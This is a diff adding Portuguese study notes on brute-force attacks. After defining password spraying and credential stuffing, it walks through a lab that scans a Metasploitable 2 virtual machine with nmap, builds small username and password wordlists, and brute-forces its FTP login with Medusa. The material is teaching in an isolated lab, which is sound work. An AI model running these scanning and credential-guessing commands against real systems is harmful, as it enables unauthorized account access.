@@ -28,3 +28,36 @@
         - **Junção de listas →** Testa todas as combinações possíveis entre listas, juntando elas.
     - **Password Spraying →** Ao invés de testar várias senhas em um usuário, testa uma mesma senha em vários usuários apenas uma vez por usuário, para tentar burlar os sistemas contra força bruta que detectam comportamento anormal.
     - **Credentiual Stuffing →** Coleta dados já vazados de um usuário para fazer a força bruta em vários sistemas.
+
+# Passo a Passo Ambiente
+
+- Instalar Kali Linux (Máquina Virtual já pronta do site)
+- Instalar Metasploitable 2 sourceforge - https://sourceforge.net/projects/metasploitable/files/Metasploitable2/(Distribuição propositalmente insegura)
+- Configurar as redes das duas máquinas virtuais como Host-only (Sempre mexer nas configurações com a VM TOTALMENTE desligada)
+- Criar Snapshot da Metasploitable2 (Com a máquina iniciada ir na aba “Máquina” e criar snapshot)
+
+# Iniciado ataque
+
+### Reconhecimento
+
+**ip a →** Ver IP no Metasploitable2
+
+**nmap - sV -p 21,22,80,445, 139 <IP Alvo> →** Realizar enumeração de portas abertas utilizando o Nmap para fazer uma varredura de rede
+
+**ftp <IP Alvo> →** Verificar se a porta FTP esta mesmo aberta.
+
+
+### Preparando arquivos (Wordlist)para ataque
+
+**Criar arquivos om nomes de usuários comuns →** echo -e “user\nmsfadmin\nadmin\nroot” > users.txt  
+
+- Esse comando cria um arquivo com os conteudos separados por \n em um arquivo de texto salva na pasta home .
+
+**Crtiar arquivo com senhas comuns →** echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+
+#Existem várias listas já prontas na internet para serem usadas ataques reais 
+
+### Ataque
+
+**Comando Medusa →** medusa -h <IP ALVO> -U users.txt -P pass.txt -M ftp -t 6
+**Ataque finalizado, é para obeter uma resposta como na imagem ataque.png no repositório**
